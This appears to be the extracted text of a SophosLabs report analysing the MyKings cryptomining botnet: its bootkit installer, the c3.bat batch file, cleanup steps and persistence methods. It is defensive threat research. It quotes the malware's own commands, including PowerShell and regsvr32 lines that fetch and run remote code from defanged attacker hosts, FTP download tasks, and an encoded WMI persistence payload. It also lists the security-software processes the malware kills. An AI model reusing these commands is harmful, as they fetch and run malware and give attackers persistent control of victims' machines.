{
    "id": "ec70a149-cac5-4f71-86e1-aa64af30ea08",
    "created_at": "2022-10-25T16:48:25.112237Z",
    "updated_at": "2025-03-27T02:14:34.05782Z",
    "deleted_at": null,
    "sha1_hash": "58b815814e28d00219c6b4dec546c23c6a6f2162",
    "title": "SophosLabs Uncut MyKings Report",
    "authors": "",
    "file_creation_date": "2019-12-18T13:55:03Z",
    "file_modification_date": "2019-12-18T13:55:03Z",
    "file_size": 3073176,
    "plain_text": "# MyKings: The Slow But Steady Growth of a Relentless Botnet\n\n## The botnet known as MyKings wields a wide range of automated methods to break into servers – all just to install cryptocurrency miners\n\n#### Gabor Szappanos, SophosLabs\n\nMyKings Page 1 of 52\n\n\n-----\n\n### Contents\n\nIntroduction ......................................................................................................................................... 4\n\nMyKings prevalence statistics ......................................................................................................... 5\n\nInfection process ............................................................................................................................... 6\n\nok.exe – the bootkit installer ........................................................................................................ 6\n\n01.dat............................................................................................................................................. 10\n\nTestMsg64.tmp ............................................................................................................................ 11\n\nc3.bat – component installation and clean-up ........................................................................ 11\n\nSystem cleanup ....................................................................................................................... 12\n\nFirewall rules ............................................................................................................................ 16\n\nComponents update ................................................................................................................ 16\n\nPersistence ............................................................................................................................... 16\n\nSystem fingerprinting .............................................................................................................. 19\n\nPredecessor: c2.bat ................................................................................................................ 19\n\nPre-predecessor: c.bat ........................................................................................................... 20\n\nInitial infection vector .................................................................................................................. 21\n\nSQL server brute forcing ........................................................................................................ 21\n\nSQL command collection ....................................................................................................... 22\n\nSQL brute forcer ...................................................................................................................... 23\n\nEternalBlue spreader .............................................................................................................. 28\n\nPayloads ....................................................................................................................................... 32\n\nPCShare ................................................................................................................................... 32\n\nDNSChanger ............................................................................................................................ 33\n\nDloadr ........................................................................................................................................ 33\n\nForshare .................................................................................................................................... 34\n\nMiners ........................................................................................................................................ 39\n\nCoinStealer ............................................................................................................................... 42\n\nFull-fledged infection ....................................................................................................................... 45\n\n1: Root cause: PowerShell script .............................................................................................. 46\n\n2. Forshare backdoor .................................................................................................................. 46\n\n3. WinRAR SFX dropper ............................................................................................................ 47\n\n2\n\n\n-----\n\n4. c3.bat ........................................................................................................................................ 47\n\n5. xmrig miner .............................................................................................................................. 48\n\n6. bootkit installer ........................................................................................................................ 48\n\n7. DNSChanger ........................................................................................................................... 48\n\n8. SQL brute forcer ...................................................................................................................... 49\n\n9. EternalBlue spreader .............................................................................................................. 49\n\nServer infrastructure ....................................................................................................................... 49\n\nFollow the money ............................................................................................................................ 50\n\n3\n\n\n-----\n\n### Introduction \n\nThe MyKings/DarkCloud/Smominru botnet (which we will refer to as MyKings) has been active for\n[a couple of years. While individual modules have been described in a handful of publications](http://www.virapro.com/focalnews/miners-snatching-open-source-tools-to-strengthen-their-malevolent-power/) in the\npast, this paper does not focus on the in-depth analysis of individual malicious components used\nduring an attack. Instead, we look at the interaction between the various tooling elements used by\nthe MyKings attackers, and their roles in the infection process, to provide a full picture of the\noperation of the botnet.\n\nThe botnet usually delivers cryptominers and remote access Trojans (RATs). Recently the threat\nactors behind MyKings added bootkit functionality to avoid detection and establish persistence\nthat's difficult to remove or mitigate.\n\nThe earliest MyKings activity goes back to 2016 and it has been active ever since, but we found\nsome overlap in samples and server infrastructure with an earlier campaign the same threat actors\n[are alleged to have been involved in, called Photominer.](https://www.guardicore.com/2016/06/the-photominer-campaign)\n\nKey findings of this research are the following:\n\n  - The botnet spreads by attacking weak username/password combinations in MySQL, MS\nSQL, telnet, ssh, IPC, WMI, RDP, and in closed-circuit TV servers, and additionally uses the\nEternalBlue exploit for lateral movement.\n\n  - During the initial infection processes, the botnet secures the computer; removes\n\nprocesses, files, and settings belonging to malware families operated by other threat\nactors; and closes the communication ports that could be used to re-infect the computer\n\n  - The botnet comprises about 45,000 infected hosts.\n\n  - The main payloads are the Forshare Trojan and various Monero cryptominers.\n\n  - [According to earlier reports the criminals made about 9,000 XMR in the past, estimated to](https://www.proofpoint.com/us/threat-insight/post/smominru-monero-mining-botnet-making-millions-operators)\n\n[be about US$3 million.](https://www.proofpoint.com/us/threat-insight/post/smominru-monero-mining-botnet-making-millions-operators)\n\n  - MyKings' current income is more moderate (mainly due to the huge drop in Monero\n\nexchange rate), but the botnet is still mining about US$300 per day.\n\n  - The criminals behind this botnet prefer to use open source or other public domain\n\nsoftware and have enough skills to make customization and enhancements to the source\ncode.\n\nThe main targets of the botnet are countries in Asia, but we could find infections all over the\nworld.\n\n4\n\n\n-----\n\n### MyKings prevalence statistics\n\nThe affected endpoints we observed totaled about 43900 unique IP addresses. This number\nincludes only those endpoints that have a public IP address; internal addresses were not counted\n(we found 10973 more using internal NAT ranges) but then we would have less confidence that we\nwere counting unique computers.\n\nThe top infected countries were:\n\n  - China\n\n  - Taiwan\n\n  - Russia\n\n  - Brazil\n\n  - USA\n\n  - India\n\n  - Japan\n\n5\n\n\n-----\n\n[This data is consistent with earlier reporting from the beginning of 2019. At that time, 35984](https://isc.sans.org/forums/diary/Malicious+Script+Leaking+Data+via+FTP/24484/1)\nunique IP addresses hosting the botnet were reported, with the three countries hosting the most\ninfected systems being the same as in our research, China, Taiwan, and Russia.\n\nThe most affected operating systems run a variety of different releases of Windows 7, which\nmakes up more than 70% of the infected hosts:\n\n### Infection process\n\nThe components of the botnet are very much interlinked, and there are many possible infection\npaths, so we start our discussion with the bootkit loader, keeping in mind that it is not the initial\nsource – that will be discussed later in a separate section.\n\n##### ok.exe – the bootkit installer\n\nThe MyKings botnet started the intensive use of the bootkit components early in 2019. However,\nthe first versions of the bootkit installer date back to as early as June, 2018.\n\n\n6\n\n\n-----\n\nCurrently there are two common variants. Both are frequently used, sometimes even at the same\ntime (using different update servers). In mid-October, 2019 we have seen a switch in the\ndistribution as they flipped from one to another nearly instantaneously.\n\nPrevalence of the first sample with SHA1 of d18188a5361f8525b85750dbe4b6a50eacf91073 was\nthe following:\n\nThis variant nearly disappeared after the 16[th] of October. A couple of days later, the second\nsample with SHA1 of 54df8f078ea7d43b25daea54e4f0a30da530289e started to appear:\n\nThe botnet's ability to deliver payloads to the infected computers meant that the changeover\ncould be executed easily; only the content of the download servers had to be changed.\n\nThe identified versions of the bootkit installer turned out to be essentially the same.\n\nThe most common variant was dropped to infected systems using the filenames ok.exe or\n_max.exe._\n\nThe version information of the executable includes Chinese text in the File Description and other\nproperty fields:\n\nHere is a rough translation of those fields:\n```\nLegalCopyright: Author Copyright Please respect and use genuine\nProductname: Easy language program\nFileDescription: Easy language program\n\n```\n7\n\n\n-----\n\n```\nComments (not on screenshot): This program is written in easy language\n\n```\n```\n  (http://www.eyuyan.com)\n\n```\nThe values in these fields look like the default placeholders. It is generally true for the components\nof the botnet that the authors don't bother to change the defaults. The use of Chinese text is also\ntypical.\n\nThe other common variant has different version information, this time masquerading as software\nfrom a (legitimate) Chinese development company called Kingsoft:\n\nThe bootkit installers are usually protected with VMProtect which makes the analysis rather\ncomplicated. However, we could recover earlier, unpacked variants which were functionally\nequivalent but made the analysis of this variant significantly easier.\n\nThis unpacked version contains a PDB path with further Chinese text fragments:\n\nEnglish translation:\n```\n  F:\\WorkSpace\\ProtocolProgram\\MBRTestSoftware\\Tool\\Release\\TestWriteShellCo\n  de.pdb\n\n```\nThe code prints out status messages that helps us understand the execution flow. For example,\nthe main function is the following:\n```\n  int __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,\n  LPWSTR lpCmdLine, int nShowCmd)\n  {\n   int v4; // esi\n   int v5; // ecx\n   __int16 v7; // [esp+4h] [ebp-20Ch]\n   char v8; // [esp+6h] [ebp-20Ah]\n   v4 = IOCTL_STORAGE_GET_DEVICE_NUMBER_0();\n   printf(\"Boot disk index: %d\\n\", v4);\n   printf(\"Ready Write Code...\\n\");\n   v7 = 0;\n   memset(&v8, 0, 0x206u);\n   vswprintf_s(v5, &v7, L\"\\\\\\\\.\\\\PhysicalDrive%d\", v4);\n   decrypt_and_write(&v7);\n   printf(\"Write Finish.\\n\");\n   return 0;\n  }\n\n```\nThe most important function is the one that creates 01.dat and 02.dat (the content that is used to\noverwrite the Volume Boot Record, or VBR); the dropper executable stores the content of these\ntwo files in encrypted form.\n```\n  int __cdecl sub_402560(void *a1, size_t a2, void *a3)\n  {\n\n```\n8\n\n\n-----\n\n```\n   int v3; // esi\n   dword_4A2114 = fopen(\"01.dat\", \"wb\");\n   fwrite(a1, a2, 1u, dword_4A2114);\n   fclose(dword_4A2114);\n   dword_4A2114 = fopen(\"01.dat\", \"rb\");\n   dword_4A2110 = fopen(\"02.dat\", \"wb\");\n   sub_401990();\n   fclose(dword_4A2114);\n   fclose(dword_4A2110);\n   dword_4A2114 = fopen(\"02.dat\", \"rb\");\n   fseek(dword_4A2114, 0, 2);\n   v3 = ftell(dword_4A2114);\n   fseek(dword_4A2114, 0, 0);\n   fread(a3, v3, 1u, dword_4A2114);\n   fclose(dword_4A2114);\n   DeleteFileA(\"01.dat\");\n   DeleteFileA(\"02.dat\");\n   return v3;\n  }\n\n```\n_ok.exe writes out the two temporary files (01.dat and 02.dat) and overwrites the Initial Program_\nLoader (IPL) with the content of the first one, by directly accessing the disk partition on\n_\\device\\harddisk\\dr0._\n\nThis action was visible in sandbox activity logs.\n\nFirst the installer reads in VBR by directly accessing zero file offset on the physical partition\n_\\device\\harddisk0\\dr0:_\n```\n    [0015.330] CreateFileW (lpFileName=\"\\\\\\\\.\\\\PhysicalDrive0\" (normalized:\n  \"\\\\device\\\\harddisk0\\\\dr0\"), dwDesiredAccess=0xc0000000, dwShareMode=0x3,\n  lpSecurityAttributes=0x0, dwCreationDisposition=0x3,\n  dwFlagsAndAttributes=0x80, hTemplateFile=0x0) returned 0x58\n    [0015.336] SetFilePointer (in: hFile=0x58, lDistanceToMove=0,\n  lpDistanceToMoveHigh=0x3af6d0*=0, dwMoveMethod=0x0 | out:\n  lpDistanceToMoveHigh=0x3af6d0*=0) returned 0x0\n    [0015.336] ReadFile (in: hFile=0x58, lpBuffer=0x254130,\n  nNumberOfBytesToRead=0x200, lpNumberOfBytesRead=0x3af6f4, lpOverlapped=0x0\n  | out: lpBuffer=0x254130*, lpNumberOfBytesRead=0x3af6f4*=0x200,\n  lpOverlapped=0x0) returned 1\n\n```\nThen it writes out the code from 01.dat into the VBR and the subsequent IPL in 512 bytes long\nchunks (using the same file handle as during the read operation).\n```\n    [0015.432] SetFilePointer (in: hFile=0x58, lDistanceToMove=1024,\n  lpDistanceToMoveHigh=0x3af6d0*=0, dwMoveMethod=0x0 | out:\n  lpDistanceToMoveHigh=0x3af6d0*=0) returned 0x400\n    [0015.432] WriteFile (in: hFile=0x58, lpBuffer=0xa3f798*,\n  nNumberOfBytesToWrite=0x200, lpNumberOfBytesWritten=0x3af6dc,\n  lpOverlapped=0x0 | out: lpBuffer=0xa3f798*,\n  lpNumberOfBytesWritten=0x3af6dc*=0x200, lpOverlapped=0x0) returned 1\n    [0015.432] WriteFile (in: hFile=0x58, lpBuffer=0xa3f998*,\n  nNumberOfBytesToWrite=0x200, lpNumberOfBytesWritten=0x3af6dc,\n  lpOverlapped=0x0 | out: lpBuffer=0xa3f998*,\n  lpNumberOfBytesWritten=0x3af6dc*=0x200, lpOverlapped=0x0) returned 1\n  ...\n\n```\n\n9\n\n\n-----\n\nThe infected IPL activates during the next reboot, and downloads further components (this is\ndescribed in the section 01.dat).\n\nThe downloaded executables start downloading further components – even though it is a\nredundant process. This is characteristic to the botnet: there are several components, and each of\nthem does a very similar self-update procedure. This way even if most of the components of the\nbotnet are removed from the computer, the remaining ones have the capability to restore it to full\nstrength.\n\nOne of the downloaded components is a WinRAR self-extracting archive that creates two files,\n_n.vbs and c3.bat. This batch file is the cornerstone of MyKings operations, a lot of activities are_\nconcentrated into this single component. See further details on it in the section about c3.bat.\n\n##### 01.dat\n\nThis image file contains the boot sector and IPL. The original boot sector content is not changed, it\n[is written back unmodified. Only the subsequent IPL code is replaced. The bootkit mechanism has](https://www.zscaler.com/blogs/research/darkcloud-bootkit)\n[been explanied in detail, we omit the technical details and focus on the big picture.](https://www.zscaler.com/blogs/research/darkcloud-bootkit)\n\nThe bootkit creates devices with the same name as some protection products would use – this\nprevents the protection modules to be loaded later in the system start-up process. The used\nmodule names are:\n```\n  \\Device\\BeepMbr\n  \\Device\\FsWriteBack\n  \\Driver\\FsWriteBack.sys\n  \\Device\\Kemon\n  \\Driver\\Bmmon.sys\n  \\Device\\360reskit\n  \\BaseNamedObjects\\ADCA43B9-9FBC-4A82-8FEB-86460EAB381D\n\n```\nIt searches the list of running processes and terminates the ones related to security products using\na hardcoded list of names. We have identified a handful of different variations of the bootkit\nwhere this list is updated with new entries. A typical list is the following:\n\n\navp.exe\n\nzhudongfangyu.exe\n\nsuperkiller.exe\n\n360sd.exe\n\n360safe.exe\n\n360rps.exe\n\nkavfs.exe\n\nsragent.exe\n\nQQPCRTP.exe\n\nsystemaidbox.exe\n\navgnt.exe\n\navengine.exe\n\nIt downloads two files:\n\n\nmsmpeng.exe\n\nnissrv.exe\n\nmsseces.exe\n\nccSvcHst.exe\n\nekrn.exe\n\nnod32krn.exe\n\naswidsagenta.exe\n\nafwserv.exe\n\nv3svc.exe\n\nacaegmgr.exe\n\nRtvscan.exe\n\navastsvc.exe\n\n\nbdagent.exe\n\nmcshield.exe\n\nmcsvhost.exe\n\nmfefire.exe\n\nmfemms.exe\n\narwsrvc.exe\n\ndwarkdaemon.exe\n\nvssery.exe\n\navguard.exe\n\nahnsdsv.exe\n\nasdsvc.exe\n\nkavfswp.exe\n\n\nmbamservice.exe\n\nmbam.exe\n\nqhpisvr.exe\n\nquhlpsvc.exe\n\nsavservice.exe\n\nhipsmain.exe\n\nhipsdaemon.exe\n\nsapissvc.exe\n\nscsecsvc.exe\n\navgsvc.exe\n\naycagentsrv.ayc\n\n\n10\n\n\n-----\n\n  - _hxxp://mbr.kill0604[.]ru/TestMsg64.tmp (or TestMsg.tmp on 32-bit systems)_\n\n  - _hxxp://www.upme0611[.]info/address.txt which is a config file_\n\nThe first one is a 64-bit shellcode file, the second one contains a list of server addresses:\n```\n  [main]\n  count=6\n  ip1=http://208.110.71.194\n  ip2=http://80.85.152.247\n  ip3=http://66.117.2.182\n  ip4=http://70.39.124.70\n  ip5=http://150.107.76.227\n  ip6=http://103.213.246.23\n  [update]\n  count=6\n  ip1=http://208.110.71.194\n  ip2=http://80.85.152.247\n  ip3=http://66.117.2.182\n  ip4=http://70.39.124.70\n  ip5=http://150.107.76.227\n  ip6=http://103.213.246.23\n\n```\nThese servers are then used in the update procedure.\n\n##### TestMsg64.tmp \n\nThis is the 64-bit shellcode downloaded by the bootkit.\n\nIt downloads the content from the hardcoded URL hxxp://74.222.14[.]97/cloud.txt which contains\nthe URL of the next component in the installation chain (which would be the dropper for c3.bat in\na typical case):\n```\n  [config]\n  url=about:blank\n  exe=hxxp://185.22.172[.]13/upsupx.exe\n\n```\nThe shellcode then downloads the URL specified in the exe section, and executes the downloaded\nfile.\n\nOn 32-bit systems a different (but functionally equivalent) shellcode file, TestMsg.tmp is\ndownloaded.\n\n##### c3.bat – component installation and clean-up\n\n_c3.bat is the component that nails down the infection process. It is a relatively large batch file; The_\nsize varies, but it normally falls somewhere between 3,000 and 20,000 bytes in size.\n\nIt spawns a few dozen processes as it completes its task which is downloading updates, installing\ncomponents, establishing persistence and cleaning up all traces that were created during the\ninitial infection process. These will be detailed in the following sections.\n\nIt is the most commonly used component of the campaigns, several dozen variants of it were\nfound which were different in minor details, like the kill list or user account names.\n\nIt is usually dropped by self-extracting RAR archives, containing two files, n.vbs and c3.bat.\n\n11\n\n\n-----\n\nThe Chinese comment text means “The following comment contains the self-extracting script\n_command” – once again, a meaningless, default text._\n\nThe VBS file is set to automatically execute on opening the archive and runs the main installer\nbatch file:\n```\n  Set ws = CreateObject(\"Wscript.Shell\")\n  on error resume next\n  ws.run \"c:\\windows\\web\\c3.bat\",vbhide\n  wscript.quit\n\n```\n**System cleanup**\n\nThe batch file starts with removing a handful of user accounts. There are slight changes in\ndifferent variants, but the first two are always there:\n```\n  mm123$\n  sysadm05\n  admin$\n  admin1$\n  asp\n\n```\nInterestingly, most of those are not created by the MyKings botnet (although the EternalBlue\nspreader adds the $admin user account). On the other hand, the creation of the mm123$ account was\n[reported here](https://blocking.net/3089/security-company-nsabuffminer-mining-trojan-attacks-on-corporate-intranets-are-growing) in relation with the NSABuffMiner Trojan.\n\nIt's not the first time anyone has seen a SQL brute force attack using this username with the\n[following event sequence:](https://threatintelligence.guardicore.com/ip/118.184.50.226)\n```\n  A user logged in using MSSQL with the following username: sa\n\n```\n```\nA user logged in using MSSQL with the following credentials: sa / ******\n\n```\n```\nA user logged in using MSSQL with the following credentials: kisadmin\n\n```\n```\nA user logged in using MSSQL with the following username: sa\n\n```\n```\nA user logged in using MSSQL with the following credentials: kisadmin\n\n```\n```\nMSSQL procedures were created: sp_addextendedproc and sp_dropextendedproc\n\n```\n```\nc:\\program files\\microsoft sql\nserver\\mssql11.sqlexpress\\mssql\\binn\\sqlservr.exe set the command line\ntaskkill.exe to run using Persistency - Image Hijack 50 times\n\n```\n\n12\n\n\n-----\n\n```\nC:\\Windows\\System32\\fuckgothin.inf was identified as malicious by YARA\naccording to rules: Suspicious Strings\n\n```\n```\nUser mm123$ was created with the password ****** 2 times\n\n```\n```\nUser mm123 was created with the password ****** and added to groups:\nAdministrators 2 times\nWMI methods were executed:\nWin32_LogicalFileSecuritySetting.Path=\"cacls.exe\"::SetSecurityDescriptor,\nWin32_LogicalFileSecuritySetting.Path=\"cmd.exe\"::SetSecurityDescriptor,\nWin32_LogicalFileSecuritySetting.Path=\"wscript.exe\"::SetSecurityDescriptor\nand\nWin32_LogicalFileSecuritySetting.Path=\"regini.exe\"::SetSecurityDescriptor\n\n```\n```\nMSSQL executed 21 shell commands\n\n```\n```\n  Process c:\\windows\\system32\\ftp.exe attempted to access suspicious\n  domains: www.mask329.com 2 times\n\n```\nWe found no relation between MyKings and the server www.mask329[.]com and the file\nfuckgothin.inf, but this event sequence seems to be related to the installation of a miner, since\nthey happened at about the same time. The latter file name used in the installation script that was\n[connected to the Bulehero miner botnet.](https://forums.juniper.net/t5/Threat-Research/Anatomy-of-the-Bulehero-Cryptomining-Botnet/ba-p/458787)\n\nSo, it is more likely that MyKings removes accounts created by competing botnets from the\ninfected computer.\n\nAfter removing the user accounts the batch file stops the AnyDesk service and disables it. We have\nfound no evidence that MyKings would target AnyDesk in any way, but in general it would attempt\nto brute force RDP passwords.\n\nThe batch file also restarts the SQL server application and deletes the file\n_c:\\windows\\system\\my1.bat which is a batch file used during the update mechanisms._\n\nThe batch file also kills a large list of processes, then removes programs for the computer. This is\nnot unusual for a malicious program, but it is usually security software that gets removed. Not in\nthe case of c3.bat: the targets look like other miner botnets or earlier versions of itself. Crypto\nmining is a very resource intensive process, there is place for only one on a computer. MyKings\ntries to make sure it doesn't have to share the precious CPU with other miners – even if friendlies.\nMany of the process names are used by older versions of the MyKings botnet, so this mechanism\ncan also serve as part of an updating process. Note that older miner versions likely used older (and\nalready blocked) wallet IDs, which are useless. The list of killed processes changed over the time,\nbut typically looks like this:\n\n```\nhelp.exe\ndoc001.exe\ndhelllllper.exe\nDOC001.exe\ndhelper.exe\nconime.exe\na.exe\ndocv8.exe\nking.exe\nname.exe\ndoc.exe\nwodCmdTerm.exe\n\n```\n```\nwin1ogins.exe\nwin1ogins.exe\nlsaus.exe\nlsars.exe\nlsacs.exe\nregedit.exe\nlsmsm.exe\nv5.exe\nanydesk.exe\nsqler.exe\nsqlservr.exe\nNsCpuCNMiner64.exe\n\n```\n```\nNsCpuCNMiner32.exe\ntlscntr.exe\neter.exe\nlsmo.exe\nlsarr.exe\nconvert.exe\nWinSCV.exe\nctfmonc.exe\nlsmose.exe\nsvhost.exe\nsecscan.exe\nwuauser.exe\n\n```\n\n13\n\n\n-----\n\n```\nsplwow64.exe\nboy.exe\npowered.EXE\nsystems.exe\nacnom.exe\nregdrv.exe\nmscsuscr.exe\nPviunc.exe\nBllianc.exe\nst.exe\nnvidia_update.exe\ndether.exe\nbuff2.exe\na.exe\nlacas.exe\n\n```\n\n14\n\n\n-----\n\nDocument Title\n\nSome of the names are more frequently used, other could be associated with particular threats, such as:\n```\n  doc001.exe (XMRig miner)\n  docv8.exe (XMRig Miner)\n  wodCmdTerm.exe (XMRig Miner)\n  NsCpuCNMiner64.exe (CNMiner)\n  tlscntr.exe (XMRig Miner)\n  ctfmonc.exe (XMRig Miner)\n  wuauser.exe (XMRig Miner)\n  mscsuscr.exe (XMRig Miner)\n  Pviunc.exe (XMRig Miner)\n  Bllianc.exe (XMRig Miner)\n  dether.exe (XMRig Miner)\n\n```\nAfter stopping the processes, the batch file deletes the executables belonging to them.\n\nFollowing that the script wipes out executables from a large list of directories. In some cases, it just\nremoves hidden/system attributes and then deletes all files.\n\nIn other cases, it first issues the cacls /e /d everyone command to block access to the specific directory.\nThen may or may not perform the delete (for some directories it does delete, for others, wouldn't).\nFinally releases the directory by granting full access to it.\n\nFor a third group the script issues a cacls /e /d system command to block access to the specific directory,\nthen does nothing about it.\n\nThis could also be a mechanism to disable execution of already installed malicious programs, including\ncrypto miners.\n\nNext the batch file deletes scheduled tasks that could belong to earlier variants of the MyKings or other\nbotnets.\n\nThe list of tasks slightly varies between the variants, a typical list is the following:\n```\n  WindowsUpdate1\n  WindowsUpdate3\n  Windows_Update\n  Update\n  Update2\n  Update4\n  Update3\n  windowsinit\n  System Security Check\n  AdobeFlashPlayer\n  updat_windows\n  at1\n  at2\n  Microsoft LocalManager[Windows Server 2008 R2 Enterprise]\n  \\Microsoft\\Windows\\UPnP\\Services\n  Microsoft LocalManager[Windows Server 2008 R2 Standard]\n\n```\nThe batch file also deletes registry autorun keys, for example:\n```\n  reg delete HKlm\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"start1\" /f\n  reg delete \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v\n  \"SHELL\" /f\n\n```\nAnd as the last step, the batch file deletes itself (and potentially earlier versions of itself) from the\nsystem).\n\n```\ndel C:\\windows\\system32\\drivers\\c3.bat\n\n```\n\n-----\n\n```\ndel c:\\windows\\web\\c3.bat\n\n```\n\n**Firewall rules**\n\nThe batch file modifies the firewall rules. The purpose is to close the ports that were used for the initial\ninfection or could be used for subsequent infections. This way the botnet protects itself from hostile\ntakeover by securing the infected computer.\n\nIt creates new firewall rules that block access to the infected computer on ports 135, 137, 138, 139 and\n445 (belonging to services like RPC, NetBIOS, and Active Directory). This closes the possibility of\nreinfection using RDP or EternalBlue exploit.\n\nOn Windows XP systems additionally closes port 445 by setting the appropriate registry key\n_SMBDeviceEnabled:_\n```\n  ver | find \"5.1.\" > NUL && sc config SharedAccess start= auto && echo Yes | reg\n  add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters /t\n  REG_DWORD /v SMBDeviceEnabled /d 0\n\n```\nThe purpose of this tedious system clean-up is to remove traces of the initial infection, older\ncomponents of the botnet, remove the competition and close the possibilities of reinfection by other\nmalware. In a way, the system ends up cleaner after the infection than before – apart for the presence\nof the MyKings components.\n\n**Components update**\n\nThe script downloads a series of different scripts from the update sites, for example:\n```\npowershell.exe IEX (New-Object\nsystem.Net.WebClient).DownloadString('hxxp://wmi.1217bye[.]host/S.ps1')&powershell.exe IEX\n(New-Object\nsystem.Net.WebClient).DownloadString('hxxp://173.208.139[.]170/s.txt')&powershell.exe IEX\n(New-Object system.Net.WebClient).DownloadString('hxxp://35.182.171[.]137/s.jpg')||regsvr32 /u\n/s /i:hxxp://wmi.1217bye[.]host/1.txt scrobj.dll&regsvr32 /u /s\n/i:hxxp://173.208.139[.]170/2.txt scrobj.dll&regsvr32 /u /s /i:hxxp://35.182.171[.]137/3.txt\nscrobj.dll\"\n\n```\nThe role of the downloaded files is the following:\n\n  - _s.ps1: terminates all svchost.exe and conhost.exe processes that are not running form the_\n\nsystem directory, and executes c:\\windows\\temp\\conhost.exe\n\n  - _s.txt: information gathering script_\n\n  - _s.jpg: kills miner related processes and defines firewall rules_\n\n  - _1.txt: downloads PE components (typically bootkit installer and c3.bat dropper)_\n\n  - _2.txt: URL list for the components_\n\nMultiple different components are downloaded, and several persistence methods are used to make sure\nthe bootkit survives a reboot on the computer, these are detailed in a separate section.\n\n**Persistence**\n\nThe batch script utilizes a handful of different methods to achieve persistence and survive a system\nrestart.\n\n16\n\n\n-----\n\n**_Bootkit_**\n\nThe bootkit component is the first of the persistence methods. Because the IPL is overwritten with the\nmalicious code, it will execute on every reboot, and downloads and executes the botnet components.\nThis process is explained in more detail in the section describing 01.dat.\n\n**_Registry autorun keys_**\n\nIn addition to that the batch file creates a registry autorun key, that uses the regsvr32.exe to fetch and\nexecute the update, in this case v.sct which is a simple scriptlet that downloads the Win32 components.\n```\n  reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"start\" /d\n  \"regsvr32 /u /s /i:hxxp://js.1226bye[.]xyz:280/v.sct scrobj.dll\" /f\n  reg add \"HKLM\\Software\\wow6432node\\Microsoft\\Windows\\CurrentVersion\\Run\" /v\n  \"start\" /d \"regsvr32 /u /s /i:hxxp://js.1226bye[.]xyz:280/v.sct scrobj.dll\" /f\n\n```\n**_Scheduled tasks_**\n\nSome of the components are registered with a separate task. The names of the tasks are typically ok,\n_Mysa, Mysa1, Mysa2 and Mysa3._\n\nThe scheduled tasks are executed on system startup with a command line that connects to an ftp server\nand downloads the update, in case of the Mysa task the executable will be saved as a.exe\n```\n  schtasks /create /tn \"Mysa\" /tr \"cmd /c echo open ftp.1226bye[.]xyz>s&echo\n  test>>s&echo 1433>>s&echo binary>>s&echo get a.exe c:\\windows\\update.exe>>s&echo\n  bye>>s&ftp -s:s&c:\\windows\\update.exe\" /ru \"system\" /sc onstart /F\n  schtasks /create /tn \"Mysa2\" /tr \"cmd /c echo open ftp.1226bye[.]xyz>p&echo\n  test>>p&echo 1433>>p&echo get s.dat c:\\windows\\debug\\item.dat>>p&echo bye>>p&ftp\n  -s:p\" /ru \"system\" /sc onstart /F\n  schtasks /create /tn \"Mysa3\" /tr \"cmd /c echo open ftp.1226bye[.]xyz>ps&echo\n  test>>ps&echo 1433>>ps&echo get s.rar c:\\windows\\help\\lsmosee.exe>>ps&echo\n  bye>>ps&ftp -s:ps&c:\\windows\\help\\lsmosee.exe\" /ru \"system\" /sc onstart /F\n\n```\nThe scheduled tasks typically download further components using ftp connection, in this particular case\nthe Forshare backdoor and a miner.\n\nThen another set of tasks start the downloaded ok.dat, which is a Windows DLL file, so the script\nexecutes the ServiceMain export with the parameter aaaa. This component is the PCShare backdoor.\n```\n  schtasks /create /tn \"Mysa1\" /tr \"rundll32.exe\n  c:\\windows\\debug\\item.dat,ServiceMain aaaa\" /ru \"system\" /sc onstart /F\n  schtasks /create /tn \"ok\" /tr \"rundll32.exe c:\\windows\\debug\\ok.dat,ServiceMain\n  aaaa\" /ru \"system\" /sc onstart /F\n\n```\n**_WMI listeners_**\n\nThe third method uses WMI filters to establish execution.\n\nc3.bat first deletes the following WMI event listeners that were created by earlier version of the botnet:\n\n     - `fuckyoumm2_filter`\n\n     - `fuckyoumm2_consumer`\n\n     - `fuckayoumm3`\n\n     - `fuckayoumm4`\n\n     - `Windows Events Consumer`\n\n     - `Windows Events Consumer4`\n\n17\n\n\n-----\n\n- `Windows Events Filter`\n\n\nThen registers the new filter with the name fuckyoumm4 which executes every 3 hours (10800 seconds)\n\n```\nwmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"fuckyoumm3\",\n\n```\n```\n  EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM\n  __InstanceModificationEvent WITHIN 10800 WHERE TargetInstance ISA\n  'Win32_PerfFormattedData_PerfOS_System'\"&wmic /NAMESPACE:\"\\\\root\\subscription\"\n  PATH CommandLineEventConsumer CREATE Name=\"fuckyoumm4\",\n  CommandLineTemplate=\"cmd /c powershell.exe -nop -enc\n  \\\"JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiA\n  EMAbABpAGUAbgB0ADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0\n  AHAAOgAvAC8AdwBtAGkALgAxADIAMQA3AGIAeQBlAC4AaABvAHMAdAAvADIALgB0AHgAdAAnACkALgB\n  0AHIAaQBtACgAKQAgAC0AcwBwAGwAaQB0ACAAJwBbAFwAcgBcAG4AXQArACcAfAAlAHsAJABuAD0AJA\n  BfAC4AcwBwAGwAaQB0ACgAJwAvACcAKQBbAC0AMQBdADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAR\n  gBpAGwAZQAoACQAXwAsACAAJABuACkAOwBzAHQAYQByAHQAIAAkAG4AOwB9AA==\\\"&powershell.ex\n  e IEX (New-Object\n  system.Net.WebClient).DownloadString('hxxp://wmi.1217bye[.]host/S.ps1')&powersh\n  ell.exe IEX (New-Object\n  system.Net.WebClient).DownloadString('hxxp://173.208.139[.]170/s.txt')&powershe\n  ll.exe IEX (New-Object\n  system.Net.WebClient).DownloadString('hxxp://35.182.171[.]137/s.jpg')||regsvr32\n  /u /s /i:hxxp://wmi.1217bye[.]host/1.txt scrobj.dll&regsvr32 /u /s\n  /i:hxxp://173.208.139[.]170/2.txt scrobj.dll&regsvr32 /u /s\n  /i:hxxp://35.182.171[.]137/3.txt scrobj.dll\"&wmic\n  /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE\n  